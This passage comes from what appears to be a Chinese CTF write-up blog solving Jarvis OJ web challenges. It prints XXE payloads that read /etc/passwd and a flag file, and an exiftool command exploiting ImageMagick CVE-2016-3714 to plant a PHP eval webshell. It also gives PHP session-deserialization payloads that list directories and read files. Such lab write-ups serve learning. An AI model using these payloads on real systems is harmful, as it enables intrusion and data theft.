class="built_in">print</span>(password)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(password)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;end!&#x27;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210219000635.png"></p><p>解md5后得:<code>eTAloCrEP</code>，登录拿到 flag</p><h1 id="api调用"><a href="#api调用" class="headerlink" title="api调用"></a>api调用</h1><p>这题是剩下没做过的，slim 架构的 xxe 漏洞，题目提示是<strong>请设法获得目标机器 &#x2F;home&#x2F;ctf&#x2F;flag.txt 中的 flag 值</strong></p><blockquote><p>参考资料</p><p><a href="https://www.leavesongs.com/PENETRATION/slim3-xxe.html">php框架slim架构上存在XXE漏洞（XXE的典型存在形式）</a></p></blockquote><p>抓包得到 json，源码是利用了 ajax ，把 json 改为 xml，把头中的 Content-Type改为 application&#x2F;xml，利用 xxe 打出 flag</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">root</span> [<span class="meta">&lt;!ENTITY <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="symbol">&amp;file;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210219001745.png"></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">root</span> [<span class="meta">&lt;!ENTITY <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///home/ctf/flag.txt&quot;</span>&gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="symbol">&amp;file;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><p>拿到 flag</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210219001839.png"></p><h1 id="图片上传漏洞"><a href="#图片上传漏洞" class="headerlink" title="图片上传漏洞"></a>图片上传漏洞</h1><p>这题现在已经挂了，但是之前已经做过了，参考别人的写一遍 wp 吧</p><blockquote><p>参考资料</p><p><a href="https://www.2cto.com/article/201605/505823.html">CVE-2016-3714 - ImageMagick 命令执行分析</a></p></blockquote><p>先用 exiftool 生成一个一句话后门 路径由 phpinfo 得到</p><p><code>exiftool -label=&quot;\&quot;|/bin/echo \&lt;?php \@eval\(\\$\_POST\[x\]\)\;?\&gt; &gt; /opt/lampp/htdocs/uploads/x.php; \&quot;&quot; 1.png</code> </p><p>接着上传该文件 </p><p>然后上传文件的时候需要注意需要 <strong>filetype&#x3D;show</strong> 或者 <strong>filetype&#x3D;win</strong>，原因就是文章中原话：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这个方法鸡肋之处在于，因为delegate.xml中配置的encode=&quot;show&quot;（或&quot;win&quot;），所以只有输出为.show或.win格式的情况下才会调用这个委托，而普通的文件处理是不会触发这个命令的。</span><br></pre></td></tr></table></figure><p>蚁剑连<code>x.php</code>密码为<code>x</code></p><h1 id="PHPINFO"><a href="#PHPINFO" class="headerlink" title="PHPINFO"></a>PHPINFO</h1><blockquote><p>参考资料</p><p><a href="https://www.cnblogs.com/sijidou/p/10455646.html">PHP反序列化与Session</a></p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//A webshell is wait for you</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OowoO</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mdzz</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;mdzz = <span class="string">&#x27;phpinfo();&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;mdzz);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;phpinfo&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$m</span> = <span class="keyword">new</span> <span class="title function_ invoke__">OowoO</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_string</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;index.php&#x27;</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这是道 php 序列化漏洞的题目<br> 1.原理</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ini_set(&#x27;session.serialize_handler&#x27;, &#x27;php_serialize&#x27;);</span><br><span class="line">ini_set(&#x27;session.serialize_handler&#x27;, &#x27;php&#x27;);</span><br><span class="line">ini_set(&#x27;session.serialize_handler&#x27;, &#x27;php_binary&#x27;);</span><br></pre></td></tr></table></figure><p>三种处理 session 的方式不同 </p><ul><li>php:存储方式是，键名+竖线+经过 serialize() 函数序列处理的值</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name|s:6:&quot;spoock&quot;</span><br></pre></td></tr></table></figure><ul><li>php_serialize(php&gt;5.5.4):存储方式是，经过 serialize() 函数序列化处理的值</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:1:&#123;s:4:&quot;name&quot;;s:6:&quot;spoock&quot;;&#125;</span><br></pre></td></tr></table></figure><ul><li>php_binary:存储方式是，键名的长度对应的 ASCII 字符 ＋ 键名 ＋ 经过 serialize() 函数反序列处理的值</li></ul><p><strong>形成原理是在用session.serialize_handler &#x3D; php_serialize存储的字符可以引入 | , 再用session.serialize_handler &#x3D; php格式取出$_SESSION的值时 “|”会被当成键值对的分隔符</strong></p><p>将 payload 写入 session ，php 有个上传文件的会将文件名写入 session 的技巧，满足以下 2 个条件就会写入到 session 中</p><ol><li><code>session.upload_progress.enabled = On</code></li><li>上传一个字段的属性名和 <code>session.upload_progress.name</code> 的值相，这里根据 phpinfo 信息看得出，值为 <code>PHP_SESSION_UPLOAD_PROGRESS</code>， 即<br><code>name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</code></li></ol><p>写个页面来打，通过这个网页去抓包改包达到目的</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>upload<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://web.jarvisoj.com:32784/index.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>“PHP_SESSION_UPLOAD_PROGRESS” 的 value不能为空</p></blockquote><p>本地生成 payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OowoO</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mdzz</span> = <span class="string">&quot;var_dump(scandir(&#x27;./&#x27;));&quot;</span>;</span><br><span class="line">   </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;mdzz);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">OowoO</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>) . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">O:<span class="number">5</span>:<span class="string">&quot;OowoO&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;mdzz&quot;</span>;s:<span class="number">24</span>:<span class="string">&quot;var_dump(scandir(&#x27;./&#x27;));&quot;</span>;&#125;</span><br><span class="line">当然这个是不行的，我们要稍微改一下，<span class="string">&quot;要转义，前面加个|</span></span><br><span class="line"><span class="string">|O:5:\&quot;OowoO\&quot;:1:&#123;s:4:\&quot;mdzz\&quot;;s:24:\&quot;var_dump(scandir(&#x27;./&#x27;));\&quot;;&#125;</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">看根目录 payload</span><br><span class="line">|O:5:\&quot;OowoO\&quot;:1:&#123;s:4:\&quot;mdzz\&quot;;s:36:\&quot;print_r(scandir(dirname(__FILE__)));\&quot;;&#125;</span><br></pre></td></tr></table></figure><p>phpinfo 页面中可以看到 session 的存放位置，有个<code>/opt/lampp/</code>估计是装的的 xampp 这个集成的环境，而这个集成环境的 web 页面放在 <code>htdocs</code> 目录下的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">|O:5:\&quot;OowoO\&quot;:1:&#123;s:4:\&quot;mdzz\&quot;;s:38:\&quot;var_dump(scandir(&#x27;/opt/lampp/&#x27;));\&quot;;&#125;</span><br><span class="line">|O:5:\&quot;OowoO\&quot;:1:&#123;s:4:\&quot;mdzz\&quot;;s:40:\&quot;var_dump(scandir(&#x27;/opt/lampp/htdocs/&#x27;));\&quot;;&#125;</span><br></pre></td></tr></table></figure><p>最后拿到 flag 的 payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">|O:5:\&quot;OowoO\&quot;:1:&#123;s:4:\&quot;mdzz\&quot;;s:89:\&quot;var_dump(file_get_contents(&#x27;/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php&#x27;));\&quot;;&#125;</span><br></pre></td></tr></table></figure><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB?"></a>WEB?</h1><p>有一个check功能，输入错误的密码会提示“Wrong Password!!”，查看源代码，有个app.js。将该js文件格式化后在里面查找字符串“Wrong Password!!”，</p><p>格式化 js 网站：(<a href="https://tool.oschina.net/codeformat/js/">https://tool.oschina.net/codeformat/js/</a>)</p><p>如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$.<span class="title function_">post</span>(<span class="string">&quot;checkpass.json&quot;</span>, t,</span><br><span class="line">       <span class="keyword">function</span>(<span class="params">t</span>) &#123;</span><br><span class="line">           self.<span class="title function_">checkpass</span>(e) ? self.<span class="title function_">setState</span>(&#123;</span><br><span class="line">               <span class="attr">errmsg</span>: <span class="string">&quot;Success!!&quot;</span>,</span><br><span class="line">               <span class="attr">errcolor</span>: b.<span class="property">green400</span></span><br><span class="line">           &#125;) : (self.<span class="title function_">setState</span>(&#123;</span><br><span class="line">               <span class="attr">errmsg</span>: <span class="string">&quot;Wrong Password!!&quot;</span>,</span><br><span class="line">               <span class="attr">errcolor</span>: b.<span class="property">red400</span></span><br><span class="line">           &#125;), <span class="built_in">setTimeout</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">               self.<span class="title function_">setState</span>(&#123;</span><br><span class="line">                   <span class="attr">errmsg</span>: <span class="string">&quot;&quot;</span></span><br><span class="line">               &#125;)</span><br><span class="line">                   &#125;,</span><br><span class="line">           <span class="number">3e3</span>))</span><br><span class="line">       &#125;)</span><br></pre></td></tr></table></figure><p>可以看到有个<code>checkpass(e)</code>函数，定位到该函数处。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">r.<span class="property">checkpass</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">                <span class="keyword">var</span> e;</span><br><span class="line">                <span class="keyword">return</span> (e = r).<span class="property">__checkpass__REACT_HOT_LOADER__</span>.<span class="title function_">apply</span>(e, <span class="variable language_">arguments</span>)</span><br><span class="line">            &#125;,</span><br></pre></td></tr></table></figure><p>定位到 <code>checkpassREACTHOTLOADER</code> 处：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="number">25</span> !== e.<span class="property">length</span>)</span><br><span class="line">                    <span class="keyword">return</span> !<span class="number">1</span>;</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">var</span> t = [], n = <span class="number">0</span>; n &lt; <span class="number">25</span>; n++)</span><br><span class="line">                    t.<span class="title function_">push</span>(e.<span class="title function_">charCodeAt</span>(n));</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">var</span> r = [<span class="number">325799</span>, <span class="number">309234</span>, <span class="number">317320</span>, <span class="number">327895</span>, <span class="number">298316</span>, <span class="number">301249</span>, <span class="number">330242</span>, <span class="number">289290</span>, <span class="number">273446</span>, <span class="number">337687</span>, <span class="number">258725</span>, <span class="number">267444</span>, <span class="number">373557</span>, <span class="number">322237</span>, <span class="number">344478</span>, <span class="number">362136</span>, <span class="number">331815</span>, <span class="number">315157</span>, <span class="number">299242</span>, <span class="number">305418</span>, <span class="number">313569</span>, <span class="number">269307</span>, <span class="number">338319</span>, <span class="number">306491</span>, <span class="number">351259</span>], o = [[<span class="number">11</span>, <span class="number">13</span>, <span class="number">32</span>, <span class="number">234</span>, <span class="number">236</span>, <span class="number">3</span>, <span class="number">72</span>, <span class="number">237</span>, <span class="number">122</span>, <span class="number">230</span>, <span class="number">157</span>, <span class="number">53</span>, <span class="number">7</span>, <span class="number">225</span>, <span class="number">193</span>, <span class="number">76</span>, <span class="number">142</span>, <span class="number">166</span>, <span class="number">11</span>, <span class="number">196</span>, <span class="number">194</span>, <span class="number">187</span>, <span class="number">152</span>, <span class="number">132</span>, <span class="number">135</span>], [<span class="number">76</span>, <span class="number">55</span>, <span class="number">38</span>, <span class="number">70</span>, <span class="number">98</span>, <span class="number">244</span>, <span class="number">201</span>, <span class="number">125</span>, <span class="number">182</span>, <span class="number">123</span>, <span class="number">47</span>, <span class="number">86</span>, <span class="number">67</span>, <span class="number">19</span>, <span class="number">145</span>, <span class="number">12</span>, <span class="number">138</span>, <span class="number">149</span>, <span class="number">83</span>, <span class="number">178</span>, <span class="number">255</span>, <span class="number">122</span>, <span class="number">238</span>, <span class="number">187</span>, <span class="number">221</span>], [<span class="number">218</span>, <span class="number">233</span>, <span class="number">17</span>, <span class="number">56</span>, <span class="number">151</span>, <span class="number">28</span>, <span class="number">150</span>, <span class="number">196</span>, <span class="number">79</span>, <span class="number">11</span>, <span class="number">150</span>, <span class="number">128</span>, <span class="number">52</span>, <span class="number">228</span>, <span class="number">189</span>, <span class="number">107</span>, <span class="number">219</span>, <span class="number">87</span>, <span class="number">90</span>, <span class="number">221</span>, <span class="number">45</span>, <span class="number">201</span>, <span class="number">14</span>, <span class="number">106</span>, <span class="number">230</span>], [<span class="number">30</span>, <span class="number">50</span>, <span class="number">76</span>, <span class="number">94</span>, <span class="number">172</span>, <span class="number">61</span>, <span class="number">229</span>, <span class="number">109</span>, <span class="number">216</span>, <span class="number">12</span>, <span class="number">181</span>, <span class="number">231</span>, <span class="number">174</span>, <span class="number">236</span>, <span class="number">159</span>, <span class="number">128</span>, <span class="number">245</span>, <span class="number">52</span>, <span class="number">43</span>, <span class="number">11</span>, <span class="number">207</span>, <span class="number">145</span>, <span class="number">241</span>, <span class="number">196</span>, <span class="number">80</span>], [<span class="number">134</span>, <span class="number">145</span>, <span class="number">36</span>, <span class="number">255</span>, <span class="number">13</span>, <span class="number">239</span>, <span class="number">212</span>, <span class="number">135</span>, <span class="number">85</span>, <span class="number">194</span>, <span class="number">200</span>, <span class="number">50</span>, <span class="number">170</span>, <span class="number">78</span>, <span class="number">51</span>, <span class="number">10</span>, <span class="number">232</span>, <span class="number">132</span>, <span class="number">60</span>, <span class="number">122</span>, <span class="number">117</span>, <span class="number">74</span>, <span class="number">117</span>, <span class="number">250</span>, <span class="number">45</span>], [<span class="number">142</span>, <span class="number">221</span>, <span class="number">121</span>, <span class="number">56</span>, <span class="number">56</span>, <span class="number">120</span>, <span class="number">113</span>, <span class="number">143</span>, <span class="number">77</span>, <span class="number">190</span>, <span class="number">195</span>, <span class="number">133</span>, <span class="number">236</span>, <span class="number">111</span>, <span class="number">144</span>, <span class="number">65</span>, <span class="number">172</span>, <span class="number">74</span>, <span class="number">160</span>, <span class="number">1</span>, <span class="number">143</span>, <span class="number">242</span>, <span class="number">96</span>, <span class="number">70</span>, <span class="number">107</span>], [<span class="number">229</span>, <span class="number">79</span>, <span class="number">167</span>, <span class="number">88</span>, <span class="number">165</span>, <span class="number">38</span>, <span class="number">108</span>, <span class="number">27</span>, <span class="number">75</span>, <span class="number">240</span>, <span class="number">116</span>, <span class="number">178</span>, <span class="number">165</span>, <span class="number">206</span>, <span class="number">156</span>, <span class="number">193</span>, <span class="number">86</span>, <span class="number">57</span>, <span class="number">148</span>, <span class="number">187</span>, <span class="number">161</span>, <span class="number">55</span>, <span class="number">134</span>, <span class="number">24</span>, <span class="number">249</span>], [<span class="number">235</span>, <span class="number">175</span>, <span class="number">235</span>, <span class="number">169</span>, <span class="number">73</span>, <span class="number">125</span>, <span class="number">114</span>, <span class="number">6</span>, <span class="number">142</span>, <span class="number">162</span>, <span class="number">228</span>, <span class="number">157</span>, <span class="number">160</span>, <span class="number">66</span>, <span class="number">28</span>, <span class="number">167</span>, <span class="number">63</span>, <span class="number">41</span>, <span class="number">182</span>, <span class="number">55</span>, <span class="number">189</span>, <span class="number">56</span>, <span class="number">102</span>, <span class="number">31</span>, <span class="number">158</span>], [<span class="number">37</span>, <span class="number">190</span>, <span class="number">169</span>, <span class="number">116</span>, <span class="number">172</span>, <span class="number">66</span>, <span class="number">9</span>, <span class="number">229</span>, <span class="number">188</span>, <span class="number">63</span>, <span class="number">138</span>, <span class="number">111</span>, <span class="number">245</span>, <span class="number">133</span>, <span class="number">22</span>, <span class="number">87</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">106</span>, <span class="number">82</span>, <span class="number">211</span>, <span class="number">252</span>, <span class="number">57</span>, <span class="number">66</span>, <span class="number">98</span>], [<span class="number">199</span>, <span class="number">48</span>, <span class="number">58</span>, <span class="number">221</span>, <span class="number">162</span>, <span class="number">57</span>, <span class="number">111</span>, <span class="number">70</span>, <span class="number">227</span>, <span class="number">126</span>, <span class="number">43</span>, <span class="number">143</span>, <span class="number">225</span>, <span class="number">85</span>, <span class="number">224</span>, <span class="number">141</span>, <span class="number">232</span>, <span class="number">141</span>, <span class="number">5</span>, <span class="number">233</span>, <span class="number">69</span>, <span class="number">70</span>, <span class="number">204</span>, <span class="number">155</span>, <span class="number">141</span>], [<span class="number">212</span>, <span class="number">83</span>, <span class="number">219</span>, <span class="number">55</span>, <span class="number">132</span>, <span class="number">5</span>, <span class="number">153</span>, <span class="number">11</span>, <span class="number">0</span>, <span class="number">89</span>, <span class="number">134</span>, <span class="number">201</span>, <span class="number">255</span>, <span class="number">101</span>, <span class="number">22</span>, <span class="number">98</span>, <span class="number">215</span>, <span class="number">139</span>, <span class="number">0</span>, <span class="number">78</span>, <span class="number">165</span>, <span class="number">0</span>, <span class="number">126</span>, <span class="number">48</span>, <span class="number">119</span>], [<span class="number">194</span>, <span class="number">156</span>, <span class="number">10</span>, <span class="number">212</span>, <span class="number">237</span>, <span class="number">112</span>, <span class="number">17</span>, <span class="number">158</span>, <span class="number">225</span>, <span class="number">227</span>, <span class="number">152</span>, <span class="number">121</span>, <span class="number">56</span>, <span class="number">10</span>, <span class="number">238</span>, <span class="number">74</span>, <span class="number">76</span>, <span class="number">66</span>, <span class="number">80</span>, <span class="number">31</span>, <span class="number">73</span>, <span class="number">10</span>, <span class="number">180</span>, <span class="number">45</span>, <span class="number">94</span>], [<span class="number">110</span>, <span class="number">231</span>, <span class="number">82</span>, <span class="number">180</span>, <span class="number">109</span>, <span class="number">209</span>, <span class="number">239</span>, <span class="number">163</span>, <span class="number">30</span>, <span class="number">160</span>, <span class="number">60</span>, <span class="number">190</span>, <span class="number">97</span>, <span class="number">256</span>, <span class="number">141</span>, <span class="number">199</span>, <span class="number">3</span>, <span class="number">30</span>, <span class="number">235</span>, <span class="number">73</span>, <span class="number">225</span>, <span class="number">244</span>, <span class="number">141</span>, <span class="number">123</span>, <span class="number">208</span>], [<span class="number">220</span>, <span class="number">248</span>, <span class="number">136</span>, <span class="number">245</span>, <span class="number">123</span>, <span class="number">82</span>, <span class="number">120</span>, <span class="number">65</span>, <span class="number">68</span>, <span class="number">136</span>, <span class="number">151</span>, <span class="number">173</span>, <span class="number">104</span>, <span class="number">107</span>, <span class="number">172</span>, <span class="number">148</span>, <span class="number">54</span>, <span class="number">218</span>, <span class="number">42</span>, <span class="number">233</span>, <span class="number">57</span>, <span class="number">115</span>, <span class="number">5</span>, <span class="number">50</span>, <span class="number">196</span>], [<span class="number">190</span>, <span class="number">34</span>, <span class="number">140</span>, <span class="number">52</span>, <span class="number">160</span>, <span class="number">34</span>, <span class="number">201</span>, <span class="number">48</span>, <span class="number">214</span>, <span class="number">33</span>, <span class="number">219</span>, <span class="number">183</span>, <span class="number">224</span>, <span class="number">237</span>, <span class="number">157</span>, <span class="number">245</span>, <span class="number">1</span>, <span class="number">134</span>, <span class="number">13</span>, <span class="number">99</span>, <span class="number">212</span>, <span class="number">230</span>, <span class="number">243</span>, <span class="number">236</span>, <span class="number">40</span>], [<span class="number">144</span>, <span class="number">246</span>, <span class="number">73</span>, <span class="number">161</span>, <span class="number">134</span>, <span class="number">112</span>, <span class="number">146</span>, <span class="number">212</span>, <span class="number">121</span>, <span class="number">43</span>, <span class="number">41</span>, <span class="number">174</span>, <span class="number">146</span>, <span class="number">78</span>, <span class="number">235</span>, <span class="number">202</span>, <span class="number">200</span>, <span class="number">90</span>, <span class="number">254</span>, <span class="number">216</span>, <span class="number">113</span>, <span class="number">25</span>, <span class="number">114</span>, <span class="number">232</span>, <span class="number">123</span>], [<span class="number">158</span>, <span class="number">85</span>, <span class="number">116</span>, <span class="number">97</span>, <span class="number">145</span>, <span class="number">21</span>, <span class="number">105</span>, <span class="number">2</span>, <span class="number">256</span>, <span class="number">69</span>, <span class="number">21</span>, <span class="number">152</span>, <span class="number">155</span>, <span class="number">88</span>, <span class="number">11</span>, <span class="number">232</span>, <span class="number">146</span>, <span class="number">238</span>, <span class="number">170</span>, <span class="number">123</span>, <span class="number">135</span>, <span class="number">150</span>, <span class="number">161</span>, <span class="number">249</span>, <span class="number">236</span>], [<span class="number">251</span>, <span class="number">96</span>, <span class="number">103</span>, <span class="number">188</span>, <span class="number">188</span>, <span class="number">8</span>, <span class="number">33</span>, <span class="number">39</span>, <span class="number">237</span>, <span class="number">63</span>, <span class="number">230</span>, <span class="number">128</span>, <span class="number">166</span>, <span class="number">130</span>, <span class="number">141</span>, <span class="number">112</span>, <span class="number">254</span>, <span class="number">234</span>, <span class="number">113</span>, <span class="number">250</span>, <span class="number">1</span>, <span class="number">89</span>, <span class="number">0</span>, <span class="number">135</span>, <span class="number">119</span>], [<span class="number">192</span>, <span class="number">206</span>, <span class="number">73</span>, <span class="number">92</span>, <span class="number">174</span>, <span class="number">130</span>, <span class="number">164</span>, <span class="number">95</span>, <span class="number">21</span>, <span class="number">153</span>, <span class="number">82</span>, <span class="number">254</span>, <span class="number">20</span>, <span class="number">133</span>, <span class="number">56</span>, <span class="number">7</span>, <span class="number">163</span>, <span class="number">48</span>, <span class="number">7</span>, <span class="number">206</span>, <span class="number">51</span>, <span class="number">204</span>, <span class="number">136</span>, <span class="number">180</span>, <span class="number">196</span>], [<span class="number">106</span>, <span class="number">63</span>, <span class="number">252</span>, <span class="number">202</span>, <span class="number">153</span>, <span class="number">6</span>, <span class="number">193</span>, <span class="number">146</span>, <span class="number">88</span>, <span class="number">118</span>, <span class="number">78</span>, <span class="number">58</span>, <span class="number">214</span>, <span class="number">168</span>, <span class="number">68</span>, <span class="number">128</span>, <span class="number">68</span>, <span class="number">35</span>, <span class="number">245</span>, <span class="number">144</span>, <span class="number">102</span>, <span class="number">20</span>, <span class="number">194</span>, <span class="number">207</span>, <span class="number">66</span>], [<span class="number">154</span>, <span class="number">98</span>, <span class="number">219</span>, <span class="number">2</span>, <span class="number">13</span>, <span class="number">65</span>, <span class="number">131</span>, <span class="number">185</span>, <span class="number">27</span>, <span class="number">162</span>, <span class="number">214</span>, <span class="number">63</span>, <span class="number">238</span>, <span class="number">248</span>, <span 